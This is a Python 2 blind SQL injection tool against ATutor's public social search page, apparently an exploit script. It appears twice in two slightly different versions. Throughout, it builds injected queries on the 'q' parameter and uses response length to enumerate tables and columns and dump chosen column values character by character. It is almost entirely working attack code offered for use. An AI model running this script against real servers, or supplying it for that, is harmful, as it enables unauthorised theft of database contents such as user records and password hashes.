# Atutor Blind SQLi tool
# Author: (m4ud)
#

import requests
import sys
from optparse import OptionParser


def searchFriends_sqli(ip, inj_str):
    bool = False
    for j in range(48, 58):
        # now we update the sqli - First REQUESTER - for intial Counting of Tables - ASCII Numeric Range only
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j

def getTables_sqli(ip, inj_str):
    # SECOND REQUESTER for extracting TABLE_NAMES - ALPHA-NUMERIC ascii based extraction
    bool = False
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            bool = True
            return j

class blind:
    def __init__(self):
      #TODO define options next to self above!
#    self.target = options.target
#    self.lhost = options.rport
        tableN = ""
        tableJ = ""
        tableCL = ""
        ip = sys.argv[1]
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip


    def getTables_number(self):
        for i in range(1, 4):

            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/table_name)),"+ str(i) + ",1))/**/from/**/information_schema.tables)=" + "[CHAR]" + "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)
        print "\r\n" + self.tableN

        for o in range(0, int(self.tableN)):
            print "\r\n======== Tables Name Char Count ==========\r\n"
            self.getTablesChar_number(o)

    def getTablesChar_number(self, o):
        for y in range(1, 3):
            try: 
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(table_name),"+ str(y) +",1))/**/from/**/information_schema.tables/**/order/**/by/**/table_name/**/limit/**/" + str(o)  + ",1)=" + "[CHAR]" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n============= Dumping Table Name ===============\r\n"
        print "TableCl value is: " + str(tableCL)
        self.dropTables_name(o, tableCL)
        self.tableCL = ""
        tableCL = ""


    def dropTables_name(self, o, tableCL):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/table_name)/**/FROM/**/INFORMATION_SCHEMA.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/" + str(o) + ",1)," + str(x)  + ",1))))=" + "[CHAR]" + "%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass


class blindC:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
#    self.lhost = options.rport
        tableN = ""
        tableJ = ""
        tableCL = ""
        ip = sys.argv[1]
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName


    def getColumns_number(self, tableName):
        for i in range(1, 3):
            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name)),"+ str(i) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) +"')=" + "[CHAR]"  +"%23"
            #injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/table_name)),"+ str(i) + ",1))/**/from/**/information_schema.tables)=" + "[CHAR]" + "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)
        print "\r\n" + self.tableN

        for o in range(0, int(self.tableN)):
            print "\r\n======== Columns Name Char Count ==========\r\n"
            self.getColumnChar_number(o, tableName)

    def getColumnChar_number(self, o, tableName):
        for y in range(1, 3):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(column_name),"+ str(y) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+ str(self.tableName) +"'/**/order/**/by/**/column_name/**/limit/**/"+ str(o) +",1)="+ "[CHAR]" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n============= Dumping Column Name ===============\r\n"
        print "TableCl value is: " + str(tableCL)
        self.dropColumn_name(o, tableCL, tableName)
        self.tableCL = ""
        tableCL = ""


    def dropColumn_name(self, o, tableCL, tableName):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/column_name)/**/FROM/**/INFORMATION_SCHEMA.columns/**/where/**/table_name='" + str(self.tableName)  + "'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/"+ str(o) +",1)," + str(x) + ",1))))="+ "[CHAR]" + "%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass


class blindD:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
#    self.lhost = options.rport
        tableN = ""
        tableJ = ""
        tableCL = ""
        ip = sys.argv[1]
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName
        self.columnName = options.columnName
        columnName = self.columnName
        self.dbName = options.dbName
        dbName = self.dbName


    def getDumpColumns_number(self, columnName, tableName, dbName):
        for i in range(1, 2):
            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name))," + str(i) + ",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+str(self.tableName)+"'/**/and/**/column_name='"+ str(self.columnName) +"')="+ "[CHAR]" +"%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)
        print "\r\n" + self.tableN

        for o in range(0, int(self.tableN)):
            print "\r\n======== Columns Item Char Count ==========\r\n"
            self.getDumpChar_number(o, tableName, columnName, dbName)

    def getDumpChar_number(self, o, tableName, columnName, dbName):
        for y in range(1, 3):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH("+ str(self.columnName)  +")," + str(y)  + ",1))/**/from/**/"+ str(self.tableName) +"/**/limit/**/"+ str(o)+",1)="+ "[CHAR]" +"%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n============= Dumping Column Requested Value ===============\r\n"
        print "TableCl value is: " + str(tableCL)
        self.dumpName(o, tableCL, tableName, columnName, dbName)
        self.tableCL = ""
        tableCL = ""


    def dumpName(self, o, tableCL, tableName, columnName, dbName):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring(("+ str(self.columnName) +"),"+ str(x) +",1)))/**/from/**/"+ str(self.dbName)+"."+str(self.tableName)+"/**/limit/**/" + str(o) + ",1)="+ "[CHAR]" +"%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass



def main():
    parser = OptionParser()
#    parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
#    parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")
    parser.add_option("-T", "--table", dest="tableName", help="Table Name")
    parser.add_option("-C", "--column", dest="columnName", help="Column Name")
    parser.add_option("-D", "--database", dest="dbName", help="Database Name")
    parser.add_option("-e", "--enumerate", dest="enum", help="Enumerate DB Tables")
    (options, args) = parser.parse_args()
#    if options.target:
#      sBlind = blind(options)
#      sBlind.start()
    
    if options.tableName and options.columnName and options.dbName:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "\r\nDumping Goods"
        columnName = options.columnName
        tableName = options.tableName
        dbName = options.dbName
#        dump = blindD(options).getDumpChar_number(tableName, columnName, dbName)
        dump = blindD(options).getDumpColumns_number(columnName, tableName, dbName)
    elif options.tableName and not options.columnName:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "Dumping Columns"
        columnName = options.columnName
        tableName = options.tableName
        columns = blindC(options).getColumns_number(tableName)
    elif options.enum:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "[+] Retrieving numbers of tables in the Database...."
        tableN = blind().getTables_number()
    
#    if len(sys.argv) != 2:
#        print "(+) usage: %s <target>"  % sys.argv[0]
#        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
#        sys.exit(-1)

    ip = sys.argv[1]
    #ip = options.target
#    print "(m4ud) Blind sql-jutsu \r\n"
#    print "[+] Retrieving numbers of tables in the Database...."

    tableN = ""
    tableJ = ""
    tableCL = ""

####    tableN = blind().getTables_number()


    print "\n(+) done!"

if __name__ == "__main__":
    main()
# Atutor Blind SQLi tool
# Author: (m4ud)
#

import requests
import sys
from optparse import OptionParser


def searchFriends_sqli(ip, inj_str):
    bool = False
    for j in range(48, 58):
        # now we update the sqli - First REQUESTER - for intial Counting of Tables - ASCII Numeric Range only
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j

def getTables_sqli(ip, inj_str):
    # SECOND REQUESTER for extracting TABLE_NAMES - ALPHA-NUMERIC ascii based extraction
    bool = False
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            bool = True
            return j

class blind:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip


    def getTables_number(self):
        for i in range(1, 4):

            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/table_name)),"+ str(i) + ",1))/**/from/**/information_schema.tables)=" + "[CHAR]" + "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)

        for o in range(0, int(self.tableN)):
            print "\r\n==========================="
            print "[+] Tables Name Char Count\r\n"
            self.getTablesChar_number(o)

    def getTablesChar_number(self, o):
        for y in range(1, 3):
            try: 
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(table_name),"+ str(y) +",1))/**/from/**/information_schema.tables/**/order/**/by/**/table_name/**/limit/**/" + str(o)  + ",1)=" + "[CHAR]" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n========================="
        print "[+] Dumping Table Names\r\n"
        #print "TableCl value is: " + str(tableCL)
        self.dropTables_name(o, tableCL)
        self.tableCL = ""
        tableCL = ""


    def dropTables_name(self, o, tableCL):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/table_name)/**/FROM/**/INFORMATION_SCHEMA.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/" + str(o) + ",1)," + str(x)  + ",1))))=" + "[CHAR]" + "%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass


class blindC:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName


    def getColumns_number(self, tableName):
        print "==============================="
        print "[+] Counting number of Columns "
        for i in range(1, 3):
            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name)),"+ str(i) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) +"')=" + "[CHAR]"  +"%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)

        for o in range(0, int(self.tableN)):
            print "\r\n============================"
            print "[+] Columns Name Char Count\r\n"
            self.getColumnChar_number(o, tableName)

    def getColumnChar_number(self, o, tableName):
        for y in range(1, 3):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(column_name),"+ str(y) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+ str(self.tableName) +"'/**/order/**/by/**/column_name/**/limit/**/"+ str(o) +",1)="+ "[CHAR]" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n================================================="
        print "[+] Enumarating Column Names from Table:"+str(self.tableName)+"\r\n"
        #print "TableCl value is: " + str(tableCL)
        self.dropColumn_name(o, tableCL, tableName)
        self.tableCL = ""
        tableCL = ""


    def dropColumn_name(self, o, tableCL, tableName):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/column_name)/**/FROM/**/INFORMATION_SCHEMA.columns/**/where/**/table_name='" + str(self.tableName)  + "'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/"+ str(o) +",1)," + str(x) + ",1))))="+ "[CHAR]" + "%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass


class blindD:
    def __init__(self, options):
      #TODO define options next to self above!
#    self.target = options.target
        tableN = ""
        tableJ = ""
        tableCL = ""
        target = options.target
        ip = target
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip
        self.tableName = options.tableName
        tableName = self.tableName
        self.columnName = options.columnName
        columnName = self.columnName
        self.dbName = options.dbName
        dbName = self.dbName


    def getDumpColumns_number(self, columnName, tableName, dbName):
        print "=============================="
        print "[+] Getting number of entries\r\n"
        for i in range(1, 2):
            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name))," + str(i) + ",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+str(self.tableName)+"'/**/and/**/column_name='"+ str(self.columnName) +"')="+ "[CHAR]" +"%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)

        for o in range(0, int(self.tableN)):
            print "\r\n====================================================="
            print "[+] Counting Column:"+str(self.columnName)+" number of Characters\r\n"
            self.getDumpChar_number(o, tableName, columnName, dbName)

    def getDumpChar_number(self, o, tableName, columnName, dbName):
        for y in range(1, 3):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH("+ str(self.columnName)  +")," + str(y)  + ",1))/**/from/**/"+ str(self.tableName) +"/**/limit/**/"+ str(o)+",1)="+ "[CHAR]" +"%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n========================================================================"
        print "[+] Dumping Column:" +str(self.columnName)+ " from Table:" + str(self.tableName)+ " from Database:"+str(self.dbName)+ "\r\n"
        #print "TableCl value is: " + str(tableCL)
        self.dumpName(o, tableCL, tableName, columnName, dbName)
        self.tableCL = ""
        tableCL = ""


    def dumpName(self, o, tableCL, tableName, columnName, dbName):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring(("+ str(self.columnName) +"),"+ str(x) +",1)))/**/from/**/"+ str(self.dbName)+"."+str(self.tableName)+"/**/limit/**/" + str(o) + ",1)="+ "[CHAR]" +"%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass



def main():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
    parser.add_option("-T", "--table", dest="tableName", help="Table Name")
    parser.add_option("-C", "--column", dest="columnName", help="Column Name")
    parser.add_option("-D", "--database", dest="dbName", help="Database Name")
    parser.add_option("-e", "--enumerate", dest="enum", help="Enumerate DB Tables")
    (options, args) = parser.parse_args()

    if options.tableName and options.columnName and options.dbName:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "\r\n[*] Dumping Goods"
        columnName = options.columnName
        tableName = options.tableName
        dbName = options.dbName
#        dump = blindD(options).getDumpChar_number(tableName, columnName, dbName)
        dump = blindD(options).getDumpColumns_number(columnName, tableName, dbName)
    elif options.tableName and not options.columnName:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "[*] Dumping Columns"
        columnName = options.columnName
        tableName = options.tableName
        columns = blindC(options).getColumns_number(tableName)
    elif options.enum:
        print "\r\n(m4ud) Blind sql-jutsu \r\n"
        print "===================================================="
        print "[+] Retrieving numbers of tables in the Database...."
        tableN = blind(options).getTables_number()
    
####    tableN = blind().getTables_number()


    print "\n(+) done!"

if __name__ == "__main__":
    main()
